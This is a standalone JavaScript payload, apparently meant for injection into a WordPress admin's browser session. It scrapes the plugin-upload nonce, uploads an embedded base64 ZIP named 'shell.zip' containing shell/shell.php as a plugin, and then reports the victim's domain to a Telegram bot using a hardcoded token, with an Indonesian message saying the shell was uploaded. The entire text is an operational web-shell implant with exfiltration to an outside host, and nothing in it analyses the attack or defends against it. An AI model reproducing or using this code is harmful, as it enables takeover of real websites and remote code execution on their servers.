(function() {
  var zipBase64 = "UEsDBAoAAAAAAJSiaV0AAAAAAAAAAAAAAAAGABwAc2hlbGwvVVQJAAOnyPFqocjxanV4CwABBBAoAAAE/wMAAFBLAwQUAAAACACUomldgduDzdIAAAAzAQAADwAcAHNoZWxsL3NoZWxsLnBocFVUCQADp8jxaqfI8Wp1eAsAAQQQKAAABP8DAABVj01Lw0AQhu/7K96DsG0Qo9cqFg9VWkSEipdQwjS7SZbsF9ndgpT+dzf2Yub2fgzPzNPa956VRcFQ4FOnTll8kJEr7Hup9eR+yzEoZ1d4uLvPumRliR1psrnaOGPICmTVhWQ7RLKe4OWoE2iI6kRBMdVioUKQcXFTv22+Kt4YwQ/LJc4MecJPiNLMs0d2mTgvkRKOasioIzWDcG7EkNnZTDH1SF47EmiVljPK6/Z9s694+49i3EnW174U9bQx61U8Gl/b/Do/3GKeXN2/m9bP7BdQSwECHgMKAAAAAACUomldAAAAAAAAAAAAAAAABgAYAAAAAAAAABAA+EUAAAAAc2hlbGwvVVQFAAOnyPFqdXgLAAEEECgAAAT/AwAAUEsBAh4DFAAAAAgAlKJpXYHbg83SAAAAMwEAAA8AGAAAAAAAAQAAALCBQAAAAHNoZWxsL3NoZWxsLnBocFVUBQADp8jxanV4CwABBBAoAAAE/wMAAFBLBQYAAAAAAgACAKEAAABbAQAAAAA=";
  fetch('/wp-admin/plugin-install.php?tab=upload')
    .then(r => r.text())
    .then(html => {
      var match = html.match(/name="_wpnonce" value="([a-zA-Z0-9]+)"/);
      if (!match) return;
      var nonce = match[1];
      var byteCharacters = atob(zipBase64);
      var byteNumbers = new Array(byteCharacters.length);
      for (var i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      var blob = new Blob([new Uint8Array(byteNumbers)], {type: 'application/zip'});
      var form = new FormData();
      form.append('_wpnonce', nonce);
      form.append('_wp_http_referer', '/wp-admin/plugin-install.php?tab=upload');
      form.append('pluginzip', blob, 'shell.zip');
      form.append('install-plugin-submit', 'Install Now');
      fetch('/wp-admin/update.php?action=upload-plugin', {
        method: 'POST',
        body: form
      }).then(() => {
        fetch('https://api.telegram.org/bot8990090054:AAF-tg7idEO3XdQ69JTNSby_W5ouZhT5gs4/sendMessage?chat_id=8938182210&text=Shell+Berhasil+Di-upload+di+'+document.domain);
      });
    });
})();
